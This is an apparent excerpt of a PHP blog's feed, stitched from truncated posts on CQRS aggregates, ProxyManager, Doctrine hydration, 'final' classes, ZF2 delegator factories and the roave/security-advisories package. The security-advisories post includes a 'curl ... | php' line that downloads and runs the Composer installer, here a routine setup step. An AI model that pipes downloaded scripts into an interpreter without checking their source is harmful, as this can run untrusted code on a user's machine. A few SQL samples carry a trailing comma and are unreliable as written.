</p>

<p>
    For those that are reading and practice CQRS+<abbr title="Event Sourcing">ES</abbr>:
    you also know that those guards aren't always simple to implement!
    Read models, projections... Oh my!
</p>

<p>
    Also: what if we wanted to react to those failures, rather than just stop
    execution? Who is responsible or that?
</p>

<p>
    If you went with the <abbr title="test driven development">TDD</abbr> way, then
    you already saw all of this coming: let's fix it!
</p>

<h3>Moving domain logic back into the domain</h3>

<p>
    What we did is putting logic from the domain layer (which should be in the aggregate)
    into the application layer: let's turn around and put domain logic in the domain (reads:
    in the aggregate logic).
</p>

<p>
    Since we don't really want to inject a payment gateway as a constituent part
    of our aggregate root (a newable shouldn't have non-newable depencencies),
    we just borrow a brutally simple concept from functional programming:
    we pass the <abbr
    title="An interactor is just an object to which we delegate some work. In this case, a service">interactor</abbr>
    as a method parameter.
</p>

<pre><code class="php">final class ShoppingCart
{
    // ... 

    public function checkOut(
        CheckOutShoppingCart $checkOut,
        PaymentGateway $paymentGateway
    ) : void {
        $charge = $checkOut-&gt;charge();

        Assert::null($this-&gt;payment, 'Already purchased');
        Assert::greaterThan(0, $this-&gt;totalAmount, 'Price invalid');
        Assert::same($this-&gt;totalAmount, $charge-&gt;amount());

        $this-&gt;charge = $paymentGateway-&gt;captureCharge($charge);

        $this-&gt;raisedEvents[] = ShoppingCartCheckedOut::from(
            $this-&gt;id,
            $this-&gt;charge
        );
    }

    // ... 
}
</code></pre>

<p>
    The command handler is also massively simplified, since all it
    does is forwarding the required dependencies to the aggregate:
</p>

<pre><code class="php">final class HandleCheckOutShoppingCart
{
    // ... 

    public function __invoke(CheckOutShoppingCart $command) : void
    {
        $this
            -&gt;shoppingCarts
            -&gt;get($command-&gt;shoppingCart())
            -&gt;checkOut($command, $this-&gt;gateway);
    }
}
</code></pre>

<h3>Conclusions</h3>

<p>
    Besides getting rid of the command handler in the scenario tests, here
    is a list of advantages of what we just implemented:
</p>

<ol>
    <li>
        The domain logic is all in one place, easy to read and easy to change.
    </li>
    <li>
        We can run the domain without infrastructure code (note: the payment gateway is a
        domain service)
    </li>
    <li>
        We can prevent invalid interactions to happen without having to push verification
        data across multiple layers
    </li>
    <li>
        Our aggregate is now able to fullfill its main role: being a domain-specific state machine,
        preventing invalid state mutations.
    </li>
    <li>
        If something goes wrong, then the aggregate is able to revert state mutations.
    </li>
    <li>
        We can raise domain events on failures, or execute custom domain logic.
    </li>
</ol>

<p>
    The approach described here fits any kind of application where there
    is a concept of <abbr title="an object with an assigned identifier">Entity</abbr> or Aggregate.
    Feel free to stuff your entity API with business logic!
</p>

<p>
    Just remember that entities should only be self-aware, and only context-aware
    in the context of certain business interactions: don't inject or statically
    access domain services from within an entity.

            <link href="https://ocramius.github.io/blog/proxy-manager-2-0-0-release/"/>
            <updated>2016-01-29T00:00:00+00:00</updated>
            <id>https://ocramius.github.io/blog/proxy-manager-2-0-0-release/</id>
            <content type="html"><![CDATA[<p style="align: center;">
    <img
        src="https://raw.githubusercontent.com/Ocramius/ProxyManager/2.0.0/proxy-manager.png"
        alt="ProxyManager"
        width="25%"
    />
</p>

<p>
    <a href="https://ocramius.github.io/ProxyManager" target="_blank">ProxyManager</a>
    <a href="https://github.com/Ocramius/ProxyManager/releases/tag/2.0.0" target="_blank">2.0.0</a>
    was finally released today!
</p>

<p>
    It took a bit more than a year to get here, but major improvements were included
    in this release, along with exclusive PHP 7 support.
</p>

<p>
    Most of the features that we planned to provide were indeed
    <a href="https://github.com/Ocramius/ProxyManager/blob/2.0.0/CHANGELOG.md#200" target="_blank">implemented into this release</a>.
</p>

<p>
    As a negative note, HHVM compatibility was not achieved, as HHVM is not yet compatible
    with PHP 7.0.x-compliant code.
</p>

<p>
    As of this release, ProxyManager 1.0.x switches to
    <a href="https://github.com/Ocramius/ProxyManager/blob/master/STABILITY.md#10x" target="_blank">security-only support</a>.
</p>

<h3>Planned maintenance schedule</h3>

<p>
    ProxyManager 2.x will be a maintenance-only release:
</p>

<ul>
    <li>
        I plan to fix bugs until <time datetime="2017-01-29">January 29, 2017</time>
    </li>
    <li>
        I plan to fix security issues until <time datetime="2018-01-29">January 29, 2018</time>
    </li>
</ul>

<p>
    No features are going to be added to ProxyManager 2.x: the current <code>master</code> branch will instead
    become the development branch for version <code>3.0.0</code>.
</p>

<p>
    Features for ProxyManager 3.0.0 are yet to be planned, but we reached exceptional code quality,
    complete test coverage and nice performance improvements with 2.0.0: the future is bright!
</p>

<h3>Thank you!</h3>

<p>
    And of course, a big <strong>"thank you"</strong> to all those who contributed to this release!

            <updated>2015-04-13T00:00:00+00:00</updated>

    Please note that this article explains complexity in internal ORM operations with the <strong>Big-O</strong>
    notation. Consider reading
    <a href="http://stackoverflow.com/questions/487258/plain-english-explanation-of-big-o" target="_blank">this article</a>, 
    if you are not familiar with the <strong>Big-O</strong> syntax.
</p>

<h2>What is hydration?</h2>

<p>
    Doctrine ORM, like most ORMs, is performing a process called <strong>Hydration</strong> when converting database
    results into objects.
</p>

<p>
    This process usually involves reading a record from a database result and then converting the column values
    into an object's properties.
</p>

<p>
    Here is a little pseudo-code snippet that shows what a mapper is actually doing under the hood:
</p>

<pre><code class="php">&lt;?php

$results          = [];
$reflectionFields = $mappingInformation-&gt;reflectionFields();

foreach ($resultSet-&gt;fetchRow() as $row) {
    $object = new $mappedClassName;

    foreach ($reflectionFields as $column =&gt; $reflectionField) {
        $reflectionField-&gt;setValue($object, $row[$column]);
    }

    $results[] = $object;
}

return $results;
</code></pre>

<p>
    That's a very basic example, but this gives you an idea of what an ORM is doing for you.
</p>

<p class="alert alert-success">
    As you can see, this is an <code>O(N)</code> operation (assuming a constant number of reflection fields).
</p>

<p>
    There are multiple ways to speed up this particular process, but we can only remove constant overhead from
    it, and not actually reduce it to something more efficient.
</p>

<h2>When is hydration expensive?</h2>

<p>
    Hydration starts to become expensive with complex resultsets.
</p>

<p>
    Consider the following SQL query:
</p>

<pre><code class="sql">SELECT
    u.id       AS userId,
    u.username AS userUsername,
    s.id       AS socialAccountId,
    s.username AS socialAccountUsername,
    s.type     AS socialAccountType
FROM
    user u
LEFT JOIN
    socialAccount s
        ON s.userId = u.id
</code></pre>

<p>
    Assuming that the relation from <code>user</code> to <code>socialAccount</code> is a <code>one-to-many</code>,
    this query retrieves all the social accounts for all the users in our application
</p>

<p>
    A resultset may be as follows:
</p>

<table class="table table-bordered table-striped">
    <thead>
        <tr>
            <th>userId</th>
            <th>userUsername</th>
            <th>socialAccountId</th>
            <th>socialAccountUsername</th>
            <th>socialAccountType</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>1</td>
            <td>ocramius@gmail.com</td>
            <td>20</td>
            <td>ocramius</td>
            <td>Facebook</td>
        </tr>
        <tr>
            <td>1</td>
            <td>ocramius@gmail.com</td>
            <td>21</td>
            <td>@ocramius</td>
            <td>Twitter</td>
        </tr>
        <tr>
            <td>1</td>
            <td>ocramius@gmail.com</td>
            <td>22</td>
            <td>ocramiusaethril</td>
            <td>Last.fm</td>
        </tr>
        <tr>
            <td>2</td>
            <td>grandpa@example.com</td>
            <td><code>NULL</code></td>
            <td><code>NULL</code></td>
            <td><code>NULL</code></td>
        </tr>
        <tr>
            <td>3</td>
            <td>grandma@example.com</td>
            <td>85</td>
            <td>awesomegrandma9917</td>
            <td>Facebook</td>
        </tr>
    </tbody>
</table>

<p>
    As you can see, we are now joining 2 tables in the results, and the ORM has to perform more complicated operations:
</p>

<dl class="dl-horizontal">
    <dt>
        Hydrate <strong>1</strong>
    </dt>
    <dd>
        <code>User</code> object for
        <i>ocramius@gmail.com</i>
    </dd>
    <dt>
        Hydrate <strong>3</strong>
    </dt>
    <dd>
        <code>SocialAccount</code> 
        instances into 
        <code>User#$socialAccounts</code> 
        for 
        <i>ocramius@gmail.com</i>,
        while skipping re-hydrating
        <code>User</code>
        <i>ocramius@gmail.com</i>
    </dd>
    <dt>
        Hydrate <strong>1</strong>
    </dt>
    <dd>
        <code>User</code>
        object for
        <i>grandpa@example.com</i>
    </dd>
    <dt>
        Skip hydrating
    </dt>
    <dd>
        <code>User#$socialAccounts</code>
        for
        <i>grandpa@example.com</i>,
        as no social accounts are associated
    </dd>
    <dt>
        Hydrate <strong>1</strong>
    </dt>
    <dd>
        <code>User</code>
        object for
        <i>grandma@example.com</i>
    </dd>
    <dt>
        Hydrate <strong>1</strong>
    </dt>
    <dd>
        <code>SocialAccount</code>
        instance into
        <code>User#$socialAccounts</code>
        for
        <i>grandma@example.com</i>
    </dd>
</dl>

<p class="alert alert-info">
    <span class="label label-info">DOCS</span>
    This operation is what is done by Doctrine ORM when you use the
    <abbr title="Doctrine Query Language">DQL</abbr>
    <a href="http://docs.doctrine-project.org/en/latest/reference/dql-doctrine-query-language.html#joins" target="_blank">
        Fetch Joins
    </a>
    feature.
</p>

<p>
    Fetch joins are a very efficient way to hydrate multiple records without resorting to multiple queries, but there
    are two performance issues with this approach (both not being covered by this article):
</p>

<ul>
    <li>
        Empty records require some useless looping inside the ORM internals (see <i>grandpa@example.com</i>'s
        social account). This is a quick operation, but we can't simply ignore those records upfront.
    </li>
    <li>
        If multiple duplicated records are being joined (happens a lot in <code>many-to-many</code> associations),
        then we want to de-duplicate records by keeping a temporary in-memory identifier map.
    </li>
</ul>

<p class="alert alert-danger">
    Additionally, our operation starts to become more complicated, as it is now <code>O(n * m)</code>, with
    <code>n</code> and <code>m</code> being the records in the <code>user</code> and the <code>socialAccount</code>
    tables.
</p>

<p>
    What the ORM is actually doing here is <strong>normalizing</strong> data that was fetched in a de-normalized
    resultset, and that is going through your CPU and your memory.
</p>

<h2>Bringing hydration cost to an extreme</h2>

<p>
    The process of hydration becomes extremely expensive when more than <strong>2</strong> <code>LEFT JOIN</code>
    operations clauses are part of our queries:
</p>

<pre><code class="sql">SELECT
    u.id         AS userId,
    u.username   AS userUsername,
    sa.id        AS socialAccountId,
    sa.username  AS socialAccountUsername,
    sa.type      AS socialAccountType,
    s.id         AS sessionId,
    s.expiresOn  AS sessionExpiresOn,
FROM
    user u
LEFT JOIN
    socialAccount sa
        ON sa.userId = u.id
LEFT JOIN
    session s
        ON s.userId = u.id
</code></pre>

<p>
    This kind of query produces a much larger resultset, and the results are duplicated by a lot:
</p>

<table class="table table-bordered table-striped" style="max-width: 500px">
    <thead>
        <tr>
            <th>userId</th>
            <th>user Username</th>
            <th>social Account Id</th>
            <th>social Account Username</th>
            <th>social Account Type</th>
            <th>session Id</th>
            <th>session Expires On</th>
        </tr>
    </thead>

</table>

<p>
    If you try to re-normalize this resultset, you can actually see how many useless de-duplication operation
    have to happen.
</p>

<p>
    That is because the <code>User</code> <i>ocramius@gmail.com</i> has multiple active sessions on
    multiple devices, as well as multiple social accounts.
</p>

<p class="alert alert-danger">
    <span class="label label-warning">SLOW!</span>
    The hydration operations on this resultset are <code>O(n * m * q)</code>, which I'm going to simply
    generalize as <code>O(n ^ m)</code>, with <code>n</code> being the amount of results, and <code>m</code>
    being the amount of joined tables.
</p>

<p>
    Here is a graphical representation of <code>O(n ^ m)</code>:
</p>

<p>
    <img
        src="/img/posts/2015-04-13-doctrine-orm-optimization-hydration/boy-that-escalated-quickly.jpg"
        alt="Boy, that escalated quickly"
    />
</p>

<p>
    Yes, it is bad.
</p>

<h2>How to avoid <code>O(n ^ m)</code> hydration?</h2>

<p>
    <code>O(n ^ m)</code> can be avoided with some very simple, yet effective approaches.
</p>

<blockquote cite="me">
    No, it's not <em>"don't use an ORM"</em>, you muppet.
</blockquote>

<h3>Avoiding <code>one-to-many</code> and <code>many-to-many</code> associations</h3>

<p>
    Collection valued associations are as useful as problematic, as you never know how much data you are
    going to load.
</p>

<p>
    Unless you use <code>fetch="EXTRA_LAZY"</code> and <code>Doctrine\Common\Collections\Collection#slice()</code>
    wisely, you will probably make your app crash if you initialize a very large collection of associated objects.
</p>

<p>
    Therefore, the simplest yet most limiting advice is to avoid collection-valued associations whenever
    they are not strictly necessary.
</p>

<p>
    Additionally, reduce the amount of bi-directional associations to the strict necessary.
</p>

<p>
    After all, code that is not required should not be written in first place.
</p>

<h3>Multi-step hydration</h3>

<p>
    The second approach is simpler, and allows us to exploit how the ORM's <code>UnitOfWork</code> is working
    internally.
</p>

<p>
    In fact, we can simply split hydration for different associations into different queries, or multiple steps:
</p>

<pre><code class="sql">SELECT
    u.id         AS userId,
    u.username   AS userUsername,
    s.id         AS socialAccountId,
    s.username   AS socialAccountUsername,
    s.type       AS socialAccountType
FROM
    user u
LEFT JOIN
    socialAccount s
        ON s.userId = u.id
</code></pre>

<p>
    We already know this query: hydration for it is <code>O(n * m)</code>, but that's the best we can do,
    regardless of how we code it.
</p>

<pre><code class="sql">SELECT
    u.id        AS userId,
    u.username  AS userUsername,
    s.id        AS sessionId,
    s.expiresOn AS sessionExpiresOn,
FROM
    user u
LEFT JOIN
    session s
        ON s.userId = u.id
</code></pre>

<p>
    This query is another <code>O(n * m)</code> hydration one, but we are now only loading the user sessions
    in the resultsets, avoiding duplicate results overall.
</p>

<p>
    By re-fetching the same users, we are telling the ORM to re-hydrate those objects (which are now in memory,
    stored in the <code>UnitOfWork</code>): that fills the <code>User#$sessions</code> collections.
</p>

<p>
    Also, please note that we could have used a <code>JOIN</code> instead of a <code>LEFT JOIN</code>, but that
    would have triggered lazy-loading on the sessions for the <i>grandpa@example.com</i> <code>User</code>
</p>

<p>
    Additionally, we could also skip the <i>userUsername</i> field from the results, as it already is in memory
    and well known.
</p>

<p class="alert alert-success">
    <span class="label label-success">SOLUTION:</span>
    We now reduced the hydration complexity from <code>O(n ^ m)</code> to <code>O(n * m * k)</code>, with
    <code>n</code> being the amount of <code>User</code> instances, <code>m</code> being the amount of associated
    <code>to-many</code> results, and <code>k</code> being the amount of associations that we want to hydrate.
</p>

<h3>Coding multi-step hydration in Doctrine ORM</h3>

<p>
    Let's get more specific and code the various queries represented above in
    <abbr title="Doctrine Query Language">DQL</abbr>.
</p>

<p>
    Here is the <code>O(n ^ m)</code> query (in this case, <code>O(n ^ 3)</code>):
</p>

<pre><code class="php">return $entityManager
    -&gt;createQuery('
        SELECT
            user, socialAccounts, sessions 
        FROM
            User user
        LEFT JOIN
            user.socialAccounts socialAccounts
        LEFT JOIN
            user.sessions sessions
    ')
    -&gt;getResult();
</code></pre>

<p>
    This is how you'd code the multi-step hydration approach:
</p>

<pre><code class="php">$users = $entityManager
    -&gt;createQuery('
        SELECT
            user, socialAccounts
        FROM
            User user
        LEFT JOIN
            user.socialAccounts socialAccounts
    ')
    -&gt;getResult();

$entityManager
    -&gt;createQuery('
        SELECT PARTIAL
            user.{id}, sessions
        FROM
            User user
        LEFT JOIN
            user.sessions sessions
    ')
    -&gt;getResult(); // result is discarded (this is just re-hydrating the collections)

return $users;
</code></pre>

<p>
    I'd also add that this is the only legitimate use-case for partial hydration that I ever
    had, but it's a personal opinion/feeling.
</p>

<h2>Other alternatives (science fiction)</h2>

<p>
    As you may have noticed, all this overhead is caused by normalizing de-normalized data coming
    from the DB.
</p>

<p>
    Other solutions that we may work on in the future include:
</p>

<ul>
    <li>
        Generating hydrator code - solves constant overhead issues, performs better with
        <abbr title="Just In Time">JIT</abbr> engines such as <abbr title="HipHop VM">HHVM</abbr>
    </li>
    <li>
        Leveraging the capabilities of powerful engines such as PostgreSQL, which comes with JSON
        support (since version 9.4), and would allow us to normalize the fetched data to some extent
    </li>
    <li>
        Generate more complex SQL, creating an own output format that is "hydrator-friendly" (re-inventing
        the wheel here seems like a bad idea)
    </li>
</ul>

<h2>Research material</h2>

<p>
    Just so you stop thinking that I pulled out all these thought out of thin air, here is a repository
    with actual code examples that you can run, measure, compare and patch yourself:

    <strong>
        <abbr title="too long, didn't read">TL;DR</abbr>: 
        Make your classes always <code>final</code>, if they implement an interface, 
        and no other public methods are defined
    </strong>
</p>

<p>
    In the last month, I had a few discussions about the usage of the <code>final</code> marker on PHP classes.
</p>

<p>
    The pattern is recurrent:
</p>

<ol>
    <li>I ask for a newly introduced class to be declared as <code>final</code></li>
    <li>the author of the code is reluctant to this proposal, stating that <code>final</code> limits flexibility</li>
    <li>I have to explain that flexibility comes from good abstractions, and not from inheritance</li>
</ol>

<p>
    It is therefore clear that coders need a better explanation of <strong>when</strong> to use <code>final</code>, 
    and when to avoid it.
</p>

<p>
    There are 
    <a href="http://verraes.net/2014/05/final-classes-in-php/" target="_blank">many</a> 
    <a href="http://www.javaworld.com/article/2073649/core-java/why-extends-is-evil.html" target="_blank">other</a>
    <a href="http://stackoverflow.com/questions/137868/using-final-modifier-whenever-applicable-in-java" target="_blank">articles</a>
    about the subject, but this is mainly thought as a "quick reference" for those
    that will ask me the same questions in future.
</p>

<h3>When to use "final":</h3>

<p>
    <code>final</code> should be used <strong>whenever possible</strong>.
</p>

<h3>Why do I have to use <code>final</code>?</h3>

<p>
    There are numerous reasons to mark a class as <code>final</code>: I will list and describe those that are
    most relevant in my opinion.
</p>

<h4>1. Preventing massive inheritance chain of doom</h4>

<p>
    Developers have the bad habit of fixing problems by providing specific subclasses of an existing (not adequate)
    solution. You probably saw it yourself with examples like following:
</p>

<pre><code class="php">&lt;?php

class Db { /* ... */ }
class Core extends Db { /* ... */ }
class User extends Core { /* ... */ }
class Admin extends User { /* ... */ }
class Bot extends Admin { /* ... */ }
class BotThatDoesSpecialThings extends Bot { /* ... */ }
class PatchedBot extends BotThatDoesSpecialThings { /* ... */ }
</code></pre>

<p>
    This is, without any doubts, how you should <strong>NOT</strong> design your code. 
</p>

<p>
    The approach described above is usually adopted by developers who confuse 
    <a href="http://c2.com/cgi/wiki?AlanKaysDefinitionOfObjectOriented" target="_blank">
        <abbr title="Object Oriented Programming">OOP</abbr>
    </a> with "<cite>a way of solving problems via inheritance</cite>"
    ("inheritance-oriented-programming", maybe?).
</p>

<h4>2. Encouraging composition</h4>

<p>
    In general, preventing inheritance in a forceful way (by default) has the nice advantage of making developers 
    think more about composition.
</p>

<p>
    There will be less stuffing functionality in existing code via inheritance, which, in my
    opinion, is a symptom of haste combined with 
    <a href="https://en.wikipedia.org/wiki/Feature_creep" target="_blank">feature creep</a>.
</p>

<p>
    Take the following naive example:
</p>

<pre><code class="php">&lt;?php

class RegistrationService implements RegistrationServiceInterface
{
    public function registerUser(/* ... */) { /* ... */ }
}

class EmailingRegistrationService extends RegistrationService
{
    public function registerUser(/* ... */) 
    {
        $user = parent::registerUser(/* ... */);

        $this-&gt;sendTheRegistrationMail($user);

        return $user;
    }

    // ...
}
</code></pre>

<p>
    By making the <code>RegistrationService</code> <code>final</code>, the idea behind 
    <code>EmailingRegistrationService</code> being a child-class of it is denied upfront, and silly mistakes such 
    as the previously shown one are easily avoided:
</p>

<pre><code class="php">&lt;?php

final class EmailingRegistrationService implements RegistrationServiceInterface
{
    public function __construct(RegistrationServiceInterface $mainRegistrationService) 
    {
        $this-&gt;mainRegistrationService = $mainRegistrationService;
    }

    public function registerUser(/* ... */) 
    {
        $user = $this-&gt;mainRegistrationService-&gt;registerUser(/* ... */);

        $this-&gt;sendTheRegistrationMail($user);

        return $user;
    }

    // ...
}
</code></pre>

<h4>3. Force the developer to think about user public API</h4>

<p>
    Developers tend to use inheritance to add accessors and additional API to existing classes:
</p>

<pre><code class="php">&lt;?php

class RegistrationService implements RegistrationServiceInterface
{
    protected $db;

    public function __construct(DbConnectionInterface $db) 
    {
        $this-&gt;db = $db;
    }

    public function registerUser(/* ... */) 
    {
        // ...

        $this-&gt;db-&gt;insert($userData);

        // ...
    }
}

class SwitchableDbRegistrationService extends RegistrationService
{
    public function setDb(DbConnectionInterface $db)
    {
        $this-&gt;db = $db;
    }
}
</code></pre>

<p>
    This example shows a set of flaws in the thought-process that led to the 
    <code>SwitchableDbRegistrationService</code>:
</p>

<ul>
    <li>
        The <code>setDb</code> method is used to change the <code>DbConnectionInterface</code> at runtime, which seems
        to hide a different problem being solved: maybe we need a <code>MasterSlaveConnection</code> instead?
    </li>
    <li>
        The <code>setDb</code> method is not covered by the <code>RegistrationServiceInterface</code>, therefore
        we can only use it when we strictly couple our code with the <code>SwitchableDbRegistrationService</code>,
        which defeats the purpose of the contract itself in some contexts.
    </li>
    <li>
        The <code>setDb</code> method changes dependencies at runtime, and that may not be supported
        by the <code>RegistrationService</code> logic, and may as well lead to bugs.
    </li>
    <li>
        Maybe the <code>setDb</code> method was introduced because of a bug in the original implementation: why
        was the fix provided this way? Is it an actual fix or does it only fix a symptom?
    </li>
</ul>

<p>
    There are more issues with the <code>setDb</code> example, but these are the most relevant ones for our purpose
    of explaining why <code>final</code> would have prevented this sort of situation upfront.
</p>

<h4>4. Force the developer to shrink an object's public API</h4>

<p>
    Since classes with a lot of public methods are very likely to break the 
    <abbr title="Single Responsibility Principle">SRP</abbr>, it is often true that a developer will want to override
    specific API of those classes.
</p>

<p>
    Starting to make every new implementation <code>final</code> forces the developer to think about new APIs upfront,
    and about keeping them as small as possible.
</p>

<h4>5. A <code>final</code> class can always be made extensible</h4>

<p>
    Coding a new class as <code>final</code> also means that you can make it extensible at any point in time (if really
    required).
</p>

<p>
    No drawbacks, but you will have to explain your reasoning for such change to yourself and other members 
    in your team, and that discussion may lead to better solutions before anything gets merged.
</p>

<h4>6. <code>extends</code> breaks encapsulation</h4>

<p>
    Unless the author of a class specifically designed it for extension, then you should consider it <code>final</code>
    even if it isn't.
</p>

<p>
    Extending a class breaks encapsulation, and can lead to unforeseen consequences and/or 
    <abbr title="Backwards Compatibility">BC</abbr> breaks: think twice before using the <code>extends</code> keyword,
    or better, make your classes <code>final</code> and avoid others from having to think about it.
</p>

<h4>7. You don't need that flexibility</h4>

<p>
    One argument that I always have to counter is that <code>final</code> reduces flexibility of use of a codebase.
</p>

<p>
    My counter-argument is very simple: you don't need that flexibility.
</p>

<p>
    Why do you need it in first place?
    Why can't you write your own customized implementation of a contract?
    Why can't you use composition?
    Did you carefully think about the problem?
</p>

<p>
    If you still need to remove the <code>final</code> keyword from an implementation, then there may be some other 
    sort of code-smell involved.
</p>

<h4>8. You are free to change the code</h4>

<p>
    Once you made a class <code>final</code>, you can change it as much as it pleases you.
</p>

<p>
    Since encapsulation is guaranteed to be maintained, the only thing that you have to care about is that the public API.
</p>

<p>
    Now you are free to rewrite everything, as many times as you want.
</p>

<h3>When to <strong>avoid</strong> <code>final</code>:</h3>

<p>
    Final classes <strong>only work effectively under following assumptions</strong>:
</p>

<ol>
    <li>There is an abstraction (interface) that the final class implements</li>
    <li>All of the public API of the final class is part of that interface</li>
</ol>

<p>
    If one of these two pre-conditions is missing, then you will likely reach a point in time when you will make the
    class extensible, as your code is not truly relying on abstractions.
</p>

<p>
    An exception can be made if a particular class represents a set of constraints or concepts that are totally 
    immutable, inflexible and global to an entire system.
    A good example is a mathematical operation: <code>$calculator->sum($a, $b)</code> will unlikely change over time.
    In these cases, it is safe to assume that we can use the <code>final</code> keyword without an abstraction to 
    rely on first.
</p>

<p>
    Another case where you do not want to use the <code>final</code> keyword is on existing classes: that can only
    be done if you follow <a href="http://semver.org/" target="_blank">semver</a> and you bump the major version
    for the affected codebase.
</p>

<h3>Try it out!</h3>

<p>
    After having read this article, consider going back to your code, and if you never did so,
    adding your first <code>final</code> marker to a class that you are planning to implement.
</p>

<p>
    You will see the rest just getting in place as expected.

            <updated>2014-12-11T00:00:00+00:00</updated>

            <content type="html"><![CDATA[<p><hr/></p>

<p>
    Since it's almost christmas, it's also time to release a new project!
</p>

<p>
    The <a href="https://twitter.com/RoaveTeam" target="_blank">Roave Team</a> is pleased to announce the release of
    <a href="https://github.com/Roave/SecurityAdvisories" target="_blank">roave/security-advisories</a>, a package
    that keeps known security issues out of your project.
</p>

<p>
    Before telling you more, go grab it:
</p>

<pre><code class="sh">mkdir roave-security-advisories-test
cd roave-security-advisories-test
curl -sS https://getcomposer.org/installer | php --

./composer.phar require roave/security-advisories:dev-master
</code></pre>

<p>
    Hold on: I will tell you what to do with it in a few.
</p>

<h3>What is it?</h3>

<p>
    <a href="https://github.com/Roave/SecurityAdvisories" target="_blank">roave/security-advisories</a> is a composer
    package that prevents installation of packages with known security issues.
</p>

<h3>Yet another one?</h3>

<p>
    Last year, <a href="https://twitter.com/fabpot" target="_blank">Fabien Potencier</a> 
    <a href="http://fabien.potencier.org/article/67/don-t-use-php-libraries-with-known-security-issues" target="_blank">announced</a>
    the <a href="https://security.sensiolabs.org/" target="_blank">security.sensiolabs.org</a> project.
    This october, he 
    <a href="http://fabien.potencier.org/article/74/the-php-security-advisories-database" target="_blank">announced again</a> 
    that the project was being moved 
    <a href="https://github.com/FriendsOfPHP/security-advisories" target="_blank">to the open-source FriendsOfPHP organization</a>.
</p>

<p>
    While I like the idea of integrating security checks with my 
    <abbr title="Continuous Integration">CI</abbr>, I don't like the fact that it is possible to install
    and run harmful software before those checks.
    <br/>
    I also don't want to install and run an additional CLI tool for something that composer can provide directly.
</p>

<p>
    That's why I had the idea of just compiling a list of <code>conflict</code> versions from 
    <a href="https://github.com/FriendsOfPHP/security-advisories" target="_blank"></a> into a composer
    <a href="https://getcomposer.org/doc/04-schema.md#type" target="_blank">metapackage</a>:
</p>

<h3>Why?</h3>

<p>
    This has various advantages:
</p>

<ul>
    <li>
        No files or actual dependencies are added to the project, since a "metapackage" does not provide 
        a vendor directory by itself
    </li>
    <li>
        Packages with security issues are filtered out during dependency resolution: they will not even be downloaded
    </li>
    <li>
        No more CLI tool to run separately, no more <abbr title="Continuous Integration">CI</abbr> setup steps
    </li>
    <li>
        No need to upgrade the tool separately
    </li>
    <li>
        No coupling or version constraints with any dependencies used by similar CLI-based alternatives
    </li>
</ul>

<h3>Try it out!</h3>

<p>
    Now that you installed <code>roave/security-advisories</code>, you can try out how it works:
</p>

<pre><code class="sh">cd roave-security-advisories-test

./composer.phar require symfony/symfony:2.5.2 # this will fail
./composer.phar require zendframework/zendframework:2.3.1 # this will fail
./composer.phar require symfony/symfony:~2.6 # works!
./composer.phar require zendframework/zendframework:~2.3 # works!
</code></pre>

<p>
    Simple enough!
</p>

<p>
    Please just note that this only works when adding new dependencies or when running <code>composer update</code>:
    security issues in your <code>composer.lock</code> cannot be checked with this technique.
</p>

<h3>Why is there no tagged version?</h3>

<p>
    Because of how composer dependency resolution works, it is not possible to have more than one version of 
    <code>roave/security-advisories</code> other than <code>dev-master</code>. More about this is on the 
    <a href="https://github.com/Roave/SecurityAdvisories" target="_blank">project page</a>

            <content type="html"><![CDATA[<p>
    Last year, I
    <a href="https://github.com/zendframework/zf2/pull/4145" target="_blank">worked on a feature</a>
    for ZF2 called
    <a href="https://framework.zend.com/manual/2.3/en/modules/zend.service-manager.delegator-factories.html" target="_blank">
        "Delegator Service Factories"
    </a>, which was included in Zend Framework 2.2.0.
</p>

<p>
    It seems to me that many ZF2 developers either don't fully understand the feature,
    or do not know it.
</p>

<p>
    This article analyzes the feature in depth and tries to explain what these do, and why you may need them.
</p>

<hr/>

<h2>The Problem</h2>

<p>
    While working with <code>Zend\ServiceManager</code>, we often find ourselves in the need
    of overriding services provided by third-party modules that we use.
</p>

<p>
    Let's make a practical example and assume that we are using a <code>DbLoggingModule</code>.
    provided by a friendly open-source developer.
</p>

<p>
    The developer of <code>DbLoggingModule</code> provided us with an awesome service
    called <code>"DbLoggingModule\Logger"</code>, which is created by a service factory
    <code>DbLoggingModule\Factory\LoggerFactory</code>:
</p>

<pre><code class="php">&lt;?php

class LoggerFactory implements FactoryInterface
{
    public function createService(ServiceLocatorInterface $sm)
    {
        $config = $sm-&gt;get('Config');
        $db     = new DB($config['db_logging']['dsn']);

        // more db configuration here

        $logger = new Logger($db);

        $logger-&gt;addFilter(new ErrorFilter());

        // more logger configuration here

        return $logger;
    }
}
</code></pre>

<p>
    This is awesome and clean, but then we want to be able to log all errors by
    removing the pre-configured filters, or we want to add a formatter to our logger to add
    contextual information to the logged messages.
</p>

<p>
    This becomes tricky, since we now have to define our own factory for that logger:
</p>

<pre><code class="php">&lt;?php

class MyLoggerFactory implements FactoryInterface
{
    public function createService(ServiceLocatorInterface $sl)
    {
        $config = $sl-&gt;get('Config');
        $db     = new DB($config['db_logging']['dsn']);

        // more db configuration here

        $logger = new Logger($db);

        // removing this: we don't filters
        // $logger-&gt;addFilter(new ErrorFilter());

        // this will add some context from the HTTP globals
        // ("eeew", but useful for our logged messages)
        $logger-&gt;addFormatter(new HttpRequestContextFormatter());

        // more logger configuration here

        return $logger;
    }
}
</code></pre>

<p>
    This is fine, but our <code>MyLoggerFactory</code> <strong>duplicates a lot of code</strong> from
    <code>LoggerFactory</code>, and we now have to also strictly monitor any updates
    by the original developer of <code>DbLoggingModule</code>.
</p>

<p class="alert alert-danger">
    Code duplication is a huge problem, especially when we're localizing
    code from external dependencies.
</p>

<p>
    We can mitigate this issue by using an initializer instead:
</p>

<pre><code class="php">&lt;?php

class MyLoggerInitializer implements InitializerInterface
{
    public function initialize($instance, ServiceLocatorInterface $sl)
    {
        if ($instance instanceof Logger) {
            $logger-&gt;clearFilters();
            $logger-&gt;addFormatter(new HttpRequestContextFormatter());
        }
    }
}
</code></pre>

<p>
    This is a much cleaner approach, but there are major disadvantages as well:
</p>

<ul>
    <li>
        This initializer is being called <strong>once per each instantiated service</strong>,
        and that can lead to hundreds (seriously!) of useless method calls per request,
        and that for a single object that we wanted to change.
    </li>
    <li>
        <strong>All</strong> of our <code>Logger</code> instances are going to be affected
        by the change, and that is a big problem if we have more than one logger in the
        application.
    </li>
</ul>

<p class="alert alert-danger">
    That's pretty much <strong>technical debt</strong> that we are building up.
    We are being lazy, and we will pay for that if we go down this route.
</p>

<p>
    The solution for this particular problem is using "delegator factories".
</p>

<hr/>

<h2>What are delegator factories?</h2>

<p class="alert alert-success">
    A delegator factory is pretty much a wrapper around a real factory: it allows us
